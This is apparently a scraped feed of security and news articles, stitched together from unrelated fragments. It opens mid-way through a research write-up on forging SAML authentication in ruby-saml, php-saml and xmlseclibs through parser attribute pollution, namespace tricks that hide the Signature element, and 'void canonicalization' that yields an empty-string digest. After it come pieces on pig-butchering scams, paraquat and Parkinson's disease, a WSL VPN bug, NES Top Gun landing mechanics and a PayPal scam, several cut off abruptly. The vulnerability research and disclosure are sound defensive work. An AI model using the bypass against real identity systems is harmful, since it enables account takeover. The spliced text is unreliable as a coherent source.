for XML parsing. This library inherits numerous legacy quirks.A great demonstration of libxml2’s fragility is found in Hakim’s "Abusing libxml2 quirks to bypass SAML authentication on GitHub Enterprise (CVE-2025-23369)", which showcases how internal caching behavior can be abused for unexpected XML processing results. Unfortunately, since both Entities and Doctypes are now restricted by 1.12.4 patch, that particular attack vector is no longer viable - forcing us to explore alternative ways to exploit parsing inconsistencies.This function looks in DTD attribute declarations for #FIXED or default declaration values.NOTE: This function ignores namespaces. Use xmlGetNsProp or xmlGetNoNsProp for namespace-aware processing.Both Ruby (Nokogiri) and PHP expose libxml2 behaviors that can desynchronize signature verification from assertion parsing. In Nokogiri, attribute lookups such as  (not a get_attribute) or the shorthand  ignore attribute namespaces and use only the simple name. When multiple attributes collide by simple name (e.g., ID and samlp:ID), only one is returned, and the documentation does not guarantee which one.In PHP’s DOM:  also retrieves an attribute by simple name only.This ambiguity can be directly observed in how parsers resolve attributes. Consider the following two equivalent-looking XML fragments: #  # In the first case, the call xmlGetProp returns 1, while in the second case it returns 2.The difference depends solely on the attribute order within the element - behavior inherited from libxml2. Because the namespace is ignored and the returned attribute is undefined when duplicates exist, developers have no control over which attribute is selected.REXML, which implements its own XML parsing logic independent of libxml2, is vulnerable to the same attribute pollution issue. Both  and  show inconsistent behavior depending on namespace handling.		# 	# In the first case, the access to the attribute by  returns 1, while in the second case it returns 2. When a namespace prefix is present, REXML’s internal lookup treats attribute names differently, leading to the opposite selection order compared to libxml2. This inconsistency means that the same XML document can produce different attribute values across parsers, allowing an attacker to manipulate which element is actually signed versus which one is processed:>
 Signature verification module locates the target of the XML Signature using the XPath query , that ignores namespacesBusiness logic then verifies that the root element’s identifier matches the one referenced by the signature - retrieving the ID via a namespace-agnostic attribute getter (e.g., , , or .As you already know, xmlns is a reserved attribute, and xml is another reserved prefix. Both are defined by the XML specification and cannot be redeclared or bound to different values.However, in REXML, these are treated internally as a regular attribute. This subtle difference creates a significant weakness. By redefining or injecting namespace declarations, an attacker can manipulate how namespace-aware XPath queries behave, causing REXML to resolve elements that other parsers - such as Nokogiri - ignores correctly:This technique also works in the opposite direction, allowing an attacker to hide the legitimate Signature element from the REXML XPath query  while keeping the document valid. By carefully nesting elements and redefining namespaces, it becomes possible to make the Signature node visible to Nokogiri but invisible to REXML:This allows the attacker to split signature detection logic, causing the parser to locate and validate a Signature element in an unintended location within the document.Now that we can craft a valid XML document that produces two different interpretations in REXML and Nokogiri, the next step is to determine where to inject malicious elements without violating the XML Schema.The XML Schema Definition (XSD) specifies the syntax and semantics of all XML-encoded SAML protocol messages. In the case of Ruby-SAML, the implementation ships with twelve XSD files, including protocol-schema.xsd, which define the structure and constraints for each element in a SAML Response.However, XML Schema validation alone does not prevent the inclusion of malicious extensions. A full list of all identified extension points is provided in the supporting materials. Among them, two elements satisfy the key requirement of appearing before the Signature element within a valid SAML Response: the Extensions element and the StatusDetail element. I will use Extensions:At this stage, we can successfully bypass the SignatureValue verification, but the process fails with an invalid DigestValue. The reason lies in how Nokogiri handles canonicalization and digest calculation. During digest computation, the parser temporarily removes the Signature element before calculating the hash, ensuring the signature is not included in the data being signed.However, in our modified document, the fake Signature element remains inside the Assertion, meaning the parser now attempts to calculate the digest over a string that already contains the signature data itself. This creates a recursive dependency - the digest must include its own hash value - achieving a valid DigestValue in this scenario would require generating a perfect hash collision.To solve this seemingly impossible problem, we need to take another close look at the SAML specification. According to the standard, the referenced element must be processed through one or more XML transformations before being hashed. By targeting this transformation stage, we open the door to a new class of attack - what I call Void Canonicalization.Canonicalization defines a consistent way to represent XML documents by standardizing details such as attribute order, whitespace, namespace declarations, and character encoding. This process ensures that two logically identical XML documents produce the same canonical byte stream, allowing reliable digital signatures and comparisons.Let's take a look at XML Signature Recommendation, which explicitly warns about the dangers of relative URIs:Limitations: the relative URIs will not be operational in the canonical form.The processing SHOULD create a new document in which relative URIs have been converted to absolute URIs, thereby mitigating any  for the new document.This behavior introduces an opportunity: if the canonicalization process encounters a limitation, such as an unresolved relative URI, it may return an error instead of a canonicalized string. Fortunately for an attacker, only a small number of XML parsers are designed to properly handle such failures. Most implementations silently continue execution, treating the missing output as an empty or “void” canonical form, effectively skipping the data that should have been included in the digest. This powerful inconsistency becomes the foundation of the Void Canonicalization attack class.To demonstrate this behavior, consider the following SAML Response that exploits the canonicalization weakness:Here, the declaration   defines a relative namespace URI. It is still a well-formed XML document, but this causes an error during libxml2 canonicalization.Instead of failing securely, Nokogiri canonicalization implementation simply returns an empty string when this error occurs. As a result, the subsequent DigestValue calculation is performed over an empty input, producing a valid hash of an empty string ( for SHA-256).This behavior can also be exploited if a malicious user gains access to the SignatureValue of the empty string. Because the hash of the canonicalized SignedInfo is what produces the final SignatureValue, an attacker who possesses a precomputed signature for an empty string can reuse it to create a fully valid signature over an arbitrary SAML Response message.Another exploit of the libxml2 canonicalization logic can be found in my previous exploit of the CVE-2025-25292 in the SAML Raider repo. Unfortunately, this is not well-formed XML, and can not be used any more.The ruby-saml 1.12.4 and php-saml libraries are vulnerable to the canonicalization exploit, and other PHP XMLDSig implementations, such as Rob Richards’ xmlseclibs are also affected. In contrast, the XMLSec Library and Shibboleth xmlsectool are not vulnerable.An example of such a "Golden SAML Response" (a message that always passes signature validation, regardless of how the assertion claims are modified) is available in the GitHub Samples folder.Even if a malicious user cannot directly access a signed SAML Assertion, it does not mean there are no valid, IdP-signed XML documents available publicly. Several types of legitimate, signed data can be repurposed for exploitation.The most straightforward source is SAML metadata. Unfortunately, these files are rarely signed, but in some cases, a signed version can be retrieved by appending parameters such as ?sign=true to metadata URLs.Another reliable source is the signed error response. According to the SAML specification, the Request Abstract Type requires only three attributes: ID, Version, and IssueInstant. These form the minimal structure for a valid SAML request message. As defined in the SAML Core 2.0 Specification:If a SAML responder deems a request to be invalid according to SAML syntax or processing rules,then if it responds, it MUST return a SAML response messageThis means that even when a request is malformed or syntactically invalid, the Identity Provider (IdP) may still issue a signed error response to indicate the failure. Invalid AuthnRequest showed below:A signed error message can also become a source of a void signature if the reflected error content inside the response triggers a canonicalization error, resulting in the digest being computed over an empty string.Finally, Web Services Federation metadata is almost always publicly available for major identity providers. These documents provide a convenient and legitimate way for attackers to obtain valid signature elements, even when the XML is not fully compliant with the SAML schema.Extracted enveloped signature inserted into Extension point Reserved  Attribute namespace declaration hides Signature element from SAML processing module but keep it for digital signature Fake signature node remains at Assertion element but keep Digest value of empty stringFinally Void canonicalization throws an unhandled exception to bypass hash restrictionsYou can download the Burp Suite extension that automates the entire exploitation process from GitHub. These vulnerabilities will also be added to the SAML Raider extension - stay tuned.To mitigate the risks described in this research, the following best practices should be adopted when implementing or maintaining SAML authentication systems:Use strict XML schemas with minimal or no extensibility points.Ensure that only signed elements are used for any future processing.Keep all SAML and XML security libraries up to date, applying the latest security patches and version updates.Avoid using email domain suffixes as a form of access control, as parser discrepancies can be exploited to bypass such restrictions.29 April 2025 - Details of the Ruby-SAML 1.12.4 vulnerability were shared with the maintainer.27 August 2025 - Ruby-SAML and PHP-SAML void canonicalization (libxml2) vulnerabilities were disclosed to their maintainers.10 October 2025 - The libxml2 vulnerability in Rob Richards’ xmlseclibs was reported to the maintainer.8 December 2025 - Rob Richards’ xmlseclibs released version 3.1.4 to fix the libxml2 canonicalization vulnerability.8 December 2025 - Ruby-SAML maintainers published an announcement addressing CVE-2025-66568 and CVE-2025-66567, affecting all versions prior to 1.18.0 (including 1.12.4).Reliable authentication security cannot depend on unsupported or poorly maintained libraries. Comprehensive and lasting remediation requires significant restructuring of existing SAML libraries. Such changes may introduce breaking compatibility issues or regressions, but they are essential to ensure the robustness of XML parsing, signature validation, and canonicalization logic. Without this foundational rework, SAML authentication will remain vulnerable to the same classes of attacks that have persisted for nearly two decades.]]></content:encoded></item><item><title>Pig butchering is the next “humanitarian global crisis” (Lock and Code S06E25)</title><link>https://www.malwarebytes.com/blog/podcast/2025/12/pig-butchering-is-the-next-humanitarian-global-crisis-lock-and-code-s06e25</link><author></author><category>threatintel</category><pubDate>Mon, 15 Dec 2025 15:39:34 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[This week on the Lock and Code podcast…This is the story of the world’s worst scam and how it is being used to fuel entire underground economies that have the power to rival nation-states across the globe. This is the story of “pig butchering.” “Pig butchering” is a violent term that is used to describe a growing type of online investment scam that has ruined the lives of countless victims all across the world. No age group is spared, nearly no country is untouched, and, if the numbers are true, with more than $6.5 billion stolen in 2024 alone, no scam might be more serious today, than this.Despite this severity, like many types of online fraud today, most pig-butchering scams start with a simple “hello.”Sent through text or as a direct message on social media platforms like X, Facebook, Instagram, or elsewhere, these initial communications are often framed as simple mistakes—a kind stranger was given your number by accident, and if you reply, you’re given a kind apology and a simple lure: “You seem like such a kind person… where are you from?”Here, the scam has already begun. Pig butchers, like romance scammers, build emotional connections with their victims. For months, their messages focus on everyday life, from family to children to marriage to work.But, with time, once the scammer believes they’ve gained the trust of their victim, they launch their attack: An investment “opportunity.”Pig butchers tell their victims that they’ve personally struck it rich by investing in cryptocurrency, and they want to share the wealth. Here, the scammers will lead their victims through opening an entirely bogus investment account, which is made to look real through sham websites that are littered with convincing tickers, snazzy analytics, and eye-popping financial returns.When the victims “invest” in these accounts, they’re actually giving money directly to their scammers. But when the victims log into their online “accounts,” they see their money growing and growing, which convinces many of them to invest even , perhaps even until their life savings are drained.This charade goes on as long as possible until the victims learn the truth and the scammers disappear. The continued theft from these victims is where “pig-butchering” gets its name—with scammers fattening up their victims before slaughter.Today, on the Lock and Code podcast with host David Ruiz, we speak with Erin West, founder of Operation Shamrock and former Deputy District Attorney of Santa Clara County, about pig butchering scams, the failures of major platforms like Meta to stop them, and why this global crisis represents far more than just a few lost dollars. “It’s really the most compelling, horrific, humanitarian global crisis that is happening in the world today.”Tune in today to listen to the full conversation.

His limbs got stiffer. He struggled to walk. He couldn’t keep living on his family farm. Shortly afterward, Friday came to believe that decades of spraying a pesticide called paraquat at his peach orchard in southwestern Michigan may be the culprit.“It explained to me why I have Parkinson’s disease,” said Friday, who is now 83, and makes that claim in a pending lawsuit.The pesticide, a weed killer, is extremely toxic.With evidence of its harms stacking up, it’s already been banned in dozens of countries all over the world, including the United Kingdom and China, where it’s made. Yet last year, its manufacturer Syngenta, a subsidiary of a company owned by the Chinese government, continued selling paraquat in the United States and other nations that haven’t banned it. Health statistics are limited. Critics point to research linking paraquat exposure to Parkinson’s, while the manufacturer pushes back, saying none of it is peer-reviewed. But the lawsuits are mounting across the United States, as farmers confront Parkinson’s after a lifetime of use, and much of the globe is turning away from paraquat. It has many critics wrestling with the question: What will it take to ban paraquat in the United States? “What we’ve seen over the course of decades is a systemic failure to protect farmworkers and the agricultural community from pesticides,” said Jonathan Kalmuss-Katz, a senior attorney at Earthjustice, an environmental law organization that advocates against paraquat.Thousands of lawsuits pile upIt was hard for Ruth Anne Krause to watch her husband of 58 years struggle to move his hands. He was an avid woodcarver, shaving intricate details into his creations, before it became too difficult for him to hold the tools.Jim Krause was diagnosed with Parkinson’s disease in 2019, after he spent decades operating a 20-acre stone fruit farm in central California. His wife says he often donned a mask and yellow rubber boots to spray paraquat on the fields.Krause, who had no family history of neurological disease as is typical, died in 2024.“I want people to know what happened,” said Ruth Anne Krause, who is worried that paraquat is still being sold to American farmers. Krause is one of thousands of people who have sued Syngenta, a manufacturer, and Chevron USA, a seller, over paraquat exposure. They’re alleging the chemical companies failed to warn of the dangers of paraquat despite knowing it could damage human nerve cells and studies showing it’s linked to Parkinson’s disease. Chevron, which never manufactured paraquat and hasn’t sold it since 1986, has “long maintained that it should not be liable in any paraquat litigation.”“And despite hundreds of studies conducted over the past 60 years, the scientific consensus is that paraquat has not been shown to be a cause of Parkinson’s disease,” the company said in a statement.Syngenta has emphasized there is no evidence that paraquat causes Parkinson’s disease.“We have great sympathy for those suffering from the debilitating effects of Parkinson’s disease,” a Syngenta spokesperson said in a statement. “However, it is important to note that the scientific evidence simply does not support a causal link between paraquat and Parkinson’s disease, and that paraquat is safe when used as directed.”More than 6,400 lawsuits against Syngenta and Chevron that allege a link between paraquat and Parkinson’s are pending in the U.S. District Court of Southern Illinois. Another 1,300 cases have been brought in Pennsylvania, 450 in California and more are scattered throughout state courts.“I do think it’s important to be clear that number is probably not even close to representative of how many people have been impacted by this,” said Christian Simmons, a legal expert for Drugwatch. Syngenta told its shareholders in March that an additional 1,600 cases have been voluntarily dismissed or resolved. In 2021, the company settled an unspecified number in California and Illinois for $187.5 million, according to a company financial report. Some others have been dismissed for missing court deadlines. None have gone to trial yet. Behind these thousands of lawsuits, a list growing nearly every day, is a person suffering from Parkinson’s disease.In Ohio, there’s Dave Jilbert a winemaker who sprayed the pesticide on his vineyard south of Cleveland. He was diagnosed with Parkinson’s in 2020 and now he is suing and working to get paraquat banned. Terri McGrath believes years of exposure to paraquat at her family farm in rural Southwest Michigan likely contributed to her Parkinson’s. Six other family members also have the disease. And in south Alabama, Mac Barlow is suing after receiving a similar diagnosis following years of relying on paraquat.“For about 40 years off and on, I’ve been using that stuff,” Barlow said. “I’ll be honest with you, if I knew it was going to be that bad, I would have tried to figure out something else.”Paraquat in the United StatesSince hitting the market in the 1960s, paraquat has been used in farming to quickly “burn” weeds before planting crops. The pesticide, originally developed by Syngenta and sold by Chevron, rips tissue apart, destroying plants on a molecular level within hours.“It’s used because it’s effective at what it does. It’s highly toxic. It’s very good at killing things,” said Geoff Horsfield, policy director at the Environmental Working Group. “And unfortunately, when a pesticide like this is so effective that also means there’s usually human health impacts as well.”By the 1970s, it became a tool in the war on drugs, sprayed to kill Mexican marijuana plants. In 1998, that history landed it in Hollywood when the Dude in “The Big Lebowski” calls someone a “human paraquat,” a buzzkill.Today, between 11 million and 17 million pounds of paraquat are sprayed annually to help grow cotton, soybean and corn fields, among other crops, throughout the country, the U.S. Geological Survey, USGS, reports. And despite the alleged known risks, its use is increasing, according to the most current federal data, more than doubling from 2012 to 2018. The USGS says on its website new pesticide use data will be released in 2025. It hasn’t been published yet. Because paraquat kills any growth it touches, it’s typically used to clear a field before any crops are planted. Low levels of paraquat residue can linger on food crops, but the foremost threat is direct exposure. Pesticides are among the most common means of suicide worldwide, according to the World Health Organization, and paraquat is frequently used because of its lethality. After some nations, like South Korea and Sri Lanka, banned it, they saw a significant drop in suicides, research shows.The U.S. Environmental Protection Agency already restricts paraquat, labeling it as “registered use,” with a skull and crossbones, meaning it can only be used by people who have a license. Because of its toxicity, the federal government requires it to have blue dye, a sharp smell and a vomiting agent, according to the U.S. Centers for Disease Control, CDC. Sprayers are also told to wear protective gear. Despite those safety measures, U.S. poison centers have gotten hundreds of paraquat-related calls in the past decade, their annual reports show.Swallowing is the most likely way to be poisoned by paraquat, according to the CDC, but skin exposure can also be deadly. In fact, if it spills on someone, health officials say they should wash it off immediately and quickly cut off their clothes. That way they don’t risk spreading more deadly pesticide on their body as they pull their shirt over their head. In one 2023 case documented by America’s Poison Centers, a 50-year-old man accidentally sipped blue liquid from a Gatorade bottle that turned out to be paraquat. After trying to throw it up, he went to the emergency room, struggling to breathe, nauseous and vomiting.Doctors rushed to treat the man, but he turned blue from a lack of oxygen and his organs failed. He died within three days.In another poison center report, a 65-year-old man spilled paraquat on his clothes and kept working. Ten days later, he went to the emergency room with second-degree burns on his stomach. Dizzy and nauseous, he was admitted for two days before going home.A week later, he went back to the ICU as his kidney, lungs and heart stopped working. He died 34 days after the spill.These annual poison center case summaries provide insight into paraquat’s toxicity, but it’s unclear exactly how many people in the U.S. have been injured or killed by the weed killer, because there’s only a patchwork of data creating an uneven and incomplete picture.The latest annual National Poison Data System report logged 114 reports and one death caused by paraquat in 2023. Over a decade, from 2014 to 2023, this system documented 1,151 paraquat calls. And a separate database shows the EPA has investigated 82 human exposure cases since 2014.Even secondary exposure can be dangerous. One case published in the Rhode Island Medical Journal described an instance where a 50-year-old man accidentally ingested paraquat, and the nurse treating him was burned by his urine that splashed onto her forearms. Within a day, her skin blistered and sloughed off.And a former Michigan State horticulture student is suing the university for $100 million, claiming that she developed thyroid cancer from her exposure to pesticides including paraquat, glyphosate and oxyfluorfen.Meanwhile, a much more widespread threat looms large in the background: long-term, low-level exposure.Parkinson’s disease is the fastest growing neurological disorder in the world, with cases projected to double by 2050, partly due to an aging population, according to a study published in The BMJ, a peer-reviewed medical journal. It occurs when the brain cells that make dopamine, a chemical that controls movement, stop working or die.The exact cause is unknown, likely a mix of genetic and, largely, environmental factors. A Parkinson’s Foundation study found that 87% of those with the disease do not have any genetic risk factors. That means, “for the vast majority of Americans, the cause of Parkinson’s disease lies not within us, but outside of us, in our environment,” said neurologist and researcher Ray Dorsey.That’s why Dorsey, who literally wrote the book on Parkinson’s, calls the disease “largely preventable.”There’s a long list of environmental factors linked to Parkinson’s, but pesticides are one of the biggest threats, according to Dorsey.“If we clean up our environment, we get rid of Parkinson’s disease,” he said. Research, dating back decades, has explored this link.An early 1987 case report published in Neurology discusses the case of a 32-year-old citrus farmer who started experiencing tremors, stiffness and clumsiness after 15 years of spraying paraquat. But “a cause-and-effect relationship is difficult to establish,” a doctor wrote at the time.A decade later, an animal study from Parkinson’s researcher Deborah Cory-Slechta found that paraquat absorbed by mice destroys the specific type of dopamine neuron that dies in Parkinson’s disease. More recently, her research has found paraquat that’s inhaled can also bypass the blood-brain barrier, threatening neurons. “It’s quite clear that it gets into the brain from inhalation models,” Cory-Slechta said. Critics point to other epidemiological studies being more definitive.In 2011, researchers studied farmworkers exposed to two pesticides, rotenone and paraquat, and determined those exposures increased the risk of developing Parkinson’s by 150%. Another study, published last year, looked at 829 Parkinson’s patients in central California. It found people who live or work near farmland where paraquat is used have a higher risk of developing the disease. “It’s kind of like secondhand smoke,” Dorsey said. “You can just live or work near where it’s sprayed and be at risk.”This is a growing concern in American suburbs where new houses press up against well-maintained golf courses. A study published in JAMA this year found that living within a mile of a golf course increased the risk of Parkinson’s disease by 126%. It didn’t name specific chemicals but did point to pesticides.The EPA in 2021 banned paraquat from golf courses “to prevent severe injury and/or death” from ingestion.Despite all that, it’s difficult to prove whether paraquat directly causes Parkinson’s because it develops years after exposure.“The disease unfolds over decades, and the seeds of Parkinson’s disease are planted early,” Dorsey said.Where do the lawsuits stand?The legal case over paraquat inched toward a settlement earlier this year.Most of the lawsuits have been brought in Illinois under what’s known as multi-district litigation. Unlike a class-action lawsuit, this puts individual cases in front of one federal judge. A few bellwether cases are then chosen to represent the masses and streamline the legal process.Syngenta, Chevron and the plaintiffs agreed to settle in April, which would wrap up thousands of cases, but an agreement is still being hammered out, court records show. If details can’t be finalized, it will go to trial.“It’s kind of like secondhand smoke. You can just live or work near where it’s sprayed and be at risk.”Ray Dorsey, a Parkinson's disease researchSyngenta has adamantly denied the lawsuits’ allegations, saying it backs paraquat as “safe and effective” when it’s used correctly and emphasizing there has been no peer-reviewed scientific analysis that shows paraquat causes Parkinson’s disease.“Syngenta believes there is no merit to the claims, but litigation can be distracting and costly,” a spokesperson said. “Entering in the agreement in no way implies that paraquat causes Parkinson’s disease or that Syngenta has done anything wrong. We stand by the safety of paraquat.”Chevron has also denied the claims saying the “scientific consensus is that paraquat has not been shown to be a cause of Parkinson’s disease.” A trove of internal documents released during litigation, as reported by The Guardian and the New Lede, appeared to show that the manufacturers were aware of evidence that paraquat could collect in the brain.But the New Lede acknowledged the documents do not show company scientists believed that paraquat causes Parkinson’s, Syngenta officials pointed out. The trail of bread crumbs started as early as 1958 when a company scientist wrote about a study of 2.2 dipyridyl, a chemical in paraquat, saying it appears to have moderate toxicity “mainly by affecting the central nervous system, and it can be absorbed through the skin,” the internal documents said. Imperial Chemical Industries, which later became Syngenta, started selling paraquat under the brand name Gramoxone in 1962, according to research. Gramoxone contains nearly 44% paraquat. The internal documents show by 1974, the company updated safety precautions, recommending that anyone spraying the pesticide wear a mask, as there were the first reports of human poisoning and concerns about the effects of paraquat started to grow.A year later, Ken Fletcher from Imperial Chemical wrote a letter to Chevron scientist Dr. Richard Cavelli, saying the chemical company knew of “sporadic reports of CNS (central nervous system) effects in paraquat poisoning” that he believed to be coincidental.Within months, Fletcher also indicated “possible chronic effects” of paraquat exposure, calling it “quite a terrible problem” that should be studied more, the documents say.“Due possibly to good publicity on our part, very few people here believe that paraquat causes any sort of problem in the field,” he wrote in the mid 1970s. “Consequently, any allegation of illness due to spraying never reaches serious proportions.”By the 1980s, outside research started to pick at the question of paraquat and Parkinson’s.“As more researchers dug into it, it’s only been more firmly established,” said Horsfield with the Environmental Working Group. Syngenta pushes back on this, though, saying two recent reports cast doubt on these claims. A 2024 scientific report from California pesticide regulators found recent evidence was “insufficient to demonstrate a direct causal association with exposure to paraquat and the increased risk of developing Parkinson’s disease.” And a September analysis from Douglas Weed, an epidemiologist and independent consultant, reached a similar conclusion.Syngenta also claims on its website to be a target of a “mass tort machine” that hovers behind multi-district litigation. Why hasn’t the EPA banned it?In 1981, Norway became the first country to outlaw paraquat due to the risk of poisoning. One by one, more countries followed suit. In 2007, the European Union approved a blanket ban for all 27 member countries, according to media reports. Yet Syngenta is still allowed to manufacture paraquat in countries that have banned its use. It’s been prohibited in the United Kingdom for 18 years and China banned paraquat to “safeguard people’s life, safety and health,” in 2012, according to a government announcement. Yet about two-thirds of the paraquat imported to the U.S. between 2022 and 2024 came from companies owned by the Chinese government, SinoChem and Red Sun Group, according to a joint report published by three advocacy organizations in October.It found most of the 40 million and 156 million pounds imported annually over the past eight years comes from Chinese manufacturing facilities, in either China or Syngenta’s big factory in northern England. Although hundreds of companies sell paraquat, Syngenta says it accounts for a quarter of global sales.According to previous media reports, SinoChem, a Chinese state-owned conglomerate, acquired Syngenta in a 2020 merger. SinoChem posted $3.4 billion in profits last year, but it’s unclear how much came from paraquat sales because the company doesn’t make earnings reports public. Syngenta reported $803 million in sales of its “non-selective herbicides,” the class that includes paraquat-containing Gramoxone, according to its 2024 financial report. While Chinese companies supply paraquat to American farmers, the report points out China is also a big purchaser of crops, like soybeans, that are grown with help from the pesticide.“In these two ways, China economically benefits from the application of paraquat in the U.S., where it outsources many of its associated health hazards,” the report said.Paraquat, now prohibited in more than 70 countries, according to the Environmental Working Group, was reauthorized by the EPA in 2021 when it passed a regularly scheduled 15-year review — a move challenged by critics. “EPA has the same information that those countries have,” said Kalmuss-Katz, the attorney with EarthJustice. “EPA has just reached a fundamentally different, and what we believe is a legally and scientifically unsupported position, which is: massive amounts of paraquat can continue to be sprayed without unreasonable risk.”The federal agency determined paraquat remains “an effective, inexpensive, versatile, and widely used method of weed control,” and any risks to workers are “outweighed by the benefits” of farms using the weed killer.“It is one of the mostly highly regulated pesticides available in the United States,” the agency said in a statement.This decision allowed it to be used with “new stronger safety measures to reduce exposure,” like requiring buffer zones where pesticides can’t be sprayed. For plants like cotton, alfalfa, soybeans and peanuts, the EPA wrote in its decision “growers may need to switch to alternative (weed-killers), which could have financial impacts.” Unlike other pesticides, paraquat works well in low temperatures and early in the season, according to the agency.“What we’ve seen over the course of decades is a systemic failure to protect farmworkers and the agricultural community from pesticides.”Jonathan Kalmuss-Katz from EarthJusticeMore than 200,000 public comments have been submitted to the EPA’s docket on paraquat over the years. Industry groups, farmers, advocacy organizations and others have all chimed in, arguing for or against the weed killer.One submitted by a North Dakota farmer, Trey Fischbach, urged the EPA to continue allowing paraquat to fight resistant weeds like kochia, writing it’s the “last tool in the toolbox.” The EPA also noted there weren’t many other options. “The chemical characteristics of paraquat are also beneficial as a resistance management tool, where few alternatives are available.” But farmers can get trapped on what critics call the “pesticide treadmill,” in which broad pesticide use leads to “superweeds” that require stronger and stronger pesticides to be knocked down.A comment submitted by Kay O’Laughlin, from Massachusetts, urged instead: “Do your job and ban paraquat because it is killing people. I speak as someone who lost a brother to Parkinson’s. People should not be disposable so that big agro can make ever greater profits!”The EPA’s 2021 decision was challenged within two months by environmental and farmworker groups who sued the EPA. Kalmuss-Katz said the groups challenged the EPA over reapproving paraquat without “truly grappling” with the connection to Parkinson’s.“The EPA here failed to adequately protect farmworkers,” he said.After that, the environmental agency shifted under President Joe Biden. The EPA decided to consider the issues raised in the lawsuits and started seeking additional information last year. In early 2025, it asked the courts for more time to assess the human health risks of paraquat.But the EPA wasn’t focused on Parkinson’s, saying in its decision the “weight of evidence was insufficient” to link paraquat exposure to the neurological disease. Rather, the federal question was over how the weed killer turns into a vapor that could harm people when inhaled or touched. “Parkinson’s Disease is not an expected health outcome of pesticidal use of paraquat,” the EPA said in its review. The study could take up to four years, according to the EPA, saying it’s “complex, large scale and is conducted under real world conditions,” while paraquat remains on the market. The agency in October updated the review, saying it’s now seeking additional information from Syngenta. Meanwhile, the EPA has shifted again. The Trump administration this year put four former industry lobbyists or executives, from the agricultural, chemical and cleaning industries, in charge of regulating pesticides at the EPA. And while it’s not clear where the agency stands on paraquat, there has been an early sign of backing away from opposition to controversial pesticides. Shortly after Kyle Kunkler, a recent American Soybean Association lobbyist, was tapped to lead pesticide policy, the EPA moved to reapprove the use of a different, controversial weed killer that had previously been banned by federal courts.Growing pressure to ban itBut grassroots pressure to ban paraquat continues to mount.“This is a pivotal time for whether paraquat is going to remain active in the United States,” said Simmons, a legal expert for Drugwatch.Last year, more than 50 Democratic lawmakers, expressing “grave concern” in letters, urged the EPA to ban paraquat.“Due to their heightened exposure to paraquat, farmworkers and rural residents are hardest hit by the harmful health effects of paraquat like Parkinson’s,” said an Oct. 7, 2024, letter signed by U.S. representatives. A separate letter was signed by a small group of senators. California, a heavy user of paraquat as the top agricultural state, became the first to move toward banning paraquat last year. But the bill ended up getting pared back with Gov. Gavin Newsom signing a law to fast-track reevaluating paraquat’s safety, reporting shows. Pennsylvania lawmakers are also considering banning it under state bills introduced this year. “There are better, healthier alternatives,” said state Rep. Natalie Mihalek, a Republican who introduced the Pennsylvania legislation.On a federal level, outside the EPA, pesticides appear to be in the crosshairs. Health and Human Services secretary Robert F. Kennedy Jr., has criticized chemicals being used in farming. But a new Make America Healthy Again report shows Kennedy has backed away from restricting pesticides after agricultural groups pushed back on the “inaccurate story about American agriculture and our food system.”At the same time, there’s been a reported industry effort to pass state laws that would protect pesticide manufacturers from liability. Two states, North Dakota and Georgia, already passed these laws, according to the National Agricultural Law Firm. But a federal bill introduced this year would ensure the manufacturers can’t be held responsible for harming farmers in any state.“This is a pivotal time for whether paraquat is going to remain active in the United States.”Christian Simmons, legal expert for DrugWatchAs this tug of war continues, paraquat continues to be sprayed on agricultural fields throughout the United States. The EPA is still assessing its risks. And nearly 90,000 Americans are getting diagnosed with Parkinson’s disease every year. Meanwhile for critics, the evidence seems clear: it’s too dangerous. “The easiest thing to do is we should ban paraquat,” Dorsey said.AL.com reporter Margaret Kates contributed to this story. ]]></content:encoded></item><item><title>Microsoft: Recent Windows updates break VPN access for WSL users</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-recent-windows-updates-cause-wsl-networking-issues/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Mon, 15 Dec 2025 14:34:31 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft says that recent Windows 11 security updates are causing VPN networking failures for enterprise users running Windows Subsystem for Linux.

But if you’re in the silent minority that have not yet mastered this skill, you’re in luck: I’ve done a little reverse engineerining and figured out  how landing works. Hopefully now you can get things really dialed in during your next practice session. Let’s get those windmill high-fives warmed up!tl;dr: Altitude must be in the range 100-299, speed must be in the range 238-337 (both inclusive), and you must be laterally aimed at the carrier at the end of the sequence.As a reminder in case you haven’t played Top Gun in the last few decades (weird), the landing portion of the stage looks like this:Mercifully, the game suggests you aim right in the middle of the acceptable range per the “Alt. 200 / Speed 288” text on your MFD. Altitude and speed are both controlled by throttle input and pitch angle. There’s no on-screen heading indicator, but the game will tell you if you’re outside of the acceptable range (“Right ! Right !”). The ranges for speed and heading are pretty tight, so focus on those: the range for altitude is much wider.After about a minute of flying the game checks your state and plays a little cutscene showing either a textbook landing or an expensive fireball. Either way, you get a “Mission Accomplished!” and go to the next level (after all, you don’t own that plane, the taxpayers do):Memory locations of note:Acceptable range (inclusive)Speed stored as a binary coded decimalHeading, ranging from -32 to +32Landing state check result0; other values change the plane’s trajectory during the crash cutsceneSpeed and altitude are stored as binary coded decimals, likely to simplify the rendering of on-screen text. For example, the number 1234 is stored as 4660 (ie., hex 0x1234).The function at $B6EA performs the state check and writes the result at $9E. If you’re just here to impress your friends and don’t want to put in the practice, the game genie code AEPETA will guarantee a landing that Maverick and Goose (spoiler: 
) would be proud of.Here’s my annotated disassembly for those following along at home:landing_skill_check:

They also set up a fake subscriber account, likely a Google Workspace mailing list, which automatically forwards any email it receives to all other group members.This allowed the criminals to use a similar method to one we’ve described before, but this time with the legitimate  address as the sender, bypassing email filters and a first casual check by the recipient.“Your automatic payment is no longer activeYou’ll need to contact Sony U.S.A. for more details or to reactivate your automatic payments. Here are the details:”BleepingComputer says there are slight variations in formating and phone numbers to call, but in essence they are all based on this method.To create urgency, the scammers made the emails look as though the target had been charged for some high-end, expensive device. They also added a fake “PayPal Support” phone number, encouraging targets to call in case if they wanted to cancel the payment of had questionsIn this type of tech support scam, the target calls the listed number, and the “support agent” on the other end asks to remotely log in to their computer to check for supposed viruses. They might run a short program to open command prompts and folders, just to scare and distract the victim. Then they’ll ask to install another tool to “fix” things, which will search the computer for anything they can turn into money. Others will sell you fake protection software and bill you for their services. Either way, the result is the same: the victim loses money. PayPal contacted BleepingComputer to let them know they were closing the loophole:“We are actively mitigating this matter, and encourage people to always be vigilant online and mindful of unexpected messages. If customers suspect they are a target of a scam, we recommend they contact Customer Support directly through the PayPal app or our Contact page for assistance.”The best way to stay safe is to stay informed about the tricks scammers use. Learn to spot the red flags that almost always give away scams and phishing emails, and remember:Use verified, official ways to contact companies. Don’t call numbers 